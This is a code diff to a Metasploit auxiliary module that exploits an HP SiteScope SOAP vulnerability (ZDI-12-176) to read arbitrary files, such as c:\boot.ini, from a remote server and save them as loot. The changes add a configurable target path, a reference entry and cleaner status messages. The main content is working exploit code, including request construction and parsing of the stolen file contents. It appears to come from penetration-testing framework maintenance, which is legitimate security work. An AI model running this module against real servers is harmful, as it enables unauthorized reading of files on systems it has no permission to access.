@@ -25,7 +25,7 @@ class Metasploit4 < Msf::Auxiliary
 			},
 			'References'   =>
 				[
-					#[ 'OSVDB', '' ],
+					[ 'OSVDB', '85119' ],
 					[ 'BID', '55269' ],
 					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-176/' ]
 				],
@@ -40,8 +40,8 @@ class Metasploit4 < Msf::Auxiliary
 		register_options(
 		[
 			Opt::RPORT(8080),
-			OptString.new('RFILE', [true, 'Remote File', 'c:\\boot.ini'])
-
+			OptString.new('RFILE', [true, 'Remote File', 'c:\\boot.ini']),
+			OptString.new('TARGETURI', [true, 'Path to SiteScope', '/SiteScope/'])
 		], self.class)
 
 		register_autofilter_ports([ 8080 ])
@@ -53,12 +53,18 @@ class Metasploit4 < Msf::Auxiliary
 	end
 
 	def run_host(ip)
+		@peer = "#{rhost}:#{rport}"
+		@uri = target_uri.path
+		@uri << '/' if @uri[-1,1] != '/'
+
+		print_status("#{@peer} - Connecting to SiteScope SOAP Interface")
+
 		res = send_request_cgi({
-			'uri'     => '/SiteScope/services/APISiteScopeImpl',
+			'uri'     => "#{@uri}services/APISiteScopeImpl",
 			'method'  => 'GET'})
 
 		if not res
-			print_error("#{rhost}:#{rport} - Unable to connect")
+			print_error("#{@peer} - Unable to connect")
 			return
 		end
 
@@ -66,7 +72,7 @@ class Metasploit4 < Msf::Auxiliary
 	end
 
 	def accessfile
-		print_status("#{rhost}:#{rport} - Retrieving the target hostname")
+		print_status("#{@peer} - Retrieving the target hostname")
 
 		data = "<?xml version='1.0' encoding='UTF-8'?>" + "\r\n"
 		data << "<wsns0:Envelope" + "\r\n"
@@ -95,7 +101,7 @@ class Metasploit4 < Msf::Auxiliary
 		data << "</wsns0:Envelope>"
 
 		res = send_request_cgi({
-			'uri'      => '/SiteScope/services/APISiteScopeImpl',
+			'uri'      => "#{@uri}services/APISiteScopeImpl",
 			'method'   => 'POST',
 			'ctype'    => 'text/xml; charset=UTF-8',
 			'data'     => data,
@@ -108,11 +114,11 @@ class Metasploit4 < Msf::Auxiliary
 		end
 
 		if not host_name or host_name.empty?
-			print_error("#{rhost}#{rport} - Failed to retrieve the host name")
+			print_error("#{@peer} - Failed to retrieve the host name")
 			return
 		end
 
-		print_status("#{rhost}:#{rport} - Retrieving the file contents")
+		print_status("#{@peer} - Retrieving the file contents")
 
 		data = "<?xml version='1.0' encoding='UTF-8'?>" + "\r\n"
 		data << "<wsns0:Envelope" + "\r\n"
@@ -139,7 +145,7 @@ class Metasploit4 < Msf::Auxiliary
 		data << "</wsns0:Envelope>"
 
 		res = send_request_cgi({
-			'uri'      => '/SiteScope/services/APISiteScopeImpl',
+			'uri'      => "#{@uri}services/APISiteScopeImpl",
 			'method'   => 'POST',
 			'ctype'    => 'text/xml; charset=UTF-8',
 			'data'     => data,
@@ -153,7 +159,7 @@ class Metasploit4 < Msf::Auxiliary
 				boundary = $1
 			end
 			if not boundary or boundary.empty?
-				print_error("#{rhost}#{rport} - Failed to retrieve the File contents")
+				print_error("#{@peer} - Failed to retrieve the file contents")
 				return
 			end
 
@@ -161,7 +167,7 @@ class Metasploit4 < Msf::Auxiliary
 				cid = $1
 			end
 			if not cid or cid.empty?
-				print_error("#{rhost}#{rport} - Failed to retrieve the File contents")
+				print_error("#{@peer} - Failed to retrieve the file contents")
 				return
 			end
 
@@ -169,17 +175,17 @@ class Metasploit4 < Msf::Auxiliary
 				loot = Rex::Text.ungzip($1)
 			end
 			if not loot or loot.empty?
-				print_error("#{rhost}#{rport} - Failed to retrieve the File contents")
+				print_error("#{@peer} - Failed to retrieve the file contents")
 				return
 			end
 
 			f = ::File.basename(datastore['RFILE'])
 			path = store_loot('hp.sitescope.file', 'application/octet-stream', rhost, loot, f, datastore['RFILE'])
-			print_status("#{rhost}:#{rport} - #{datastore['RFILE']} saved in #{path}")
+			print_status("#{@peer} - #{datastore['RFILE']} saved in #{path}")
 			return
 		end
 
-		print_error("#{rhost}#{rport} - Failed to retrieve the File contents")
+		print_error("#{@peer} - Failed to retrieve the file contents")
 	end
 
 end
